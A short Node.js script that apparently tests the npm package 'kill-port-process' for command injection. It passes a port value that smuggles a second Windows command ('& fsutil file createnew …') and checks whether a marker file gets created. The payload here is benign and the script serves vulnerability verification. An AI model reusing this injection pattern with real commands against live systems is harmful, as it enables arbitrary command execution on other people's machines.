var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const killPortProcess = require('kill-port-process');
const fs = require('fs');
const path = './kill-port-process';
const PORT = '& fsutil file createnew kill-port-process 0 &';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
console.log(killPortProcess(PORT).then(() => {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
}).catch(err => {
}).finally(() => {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
}));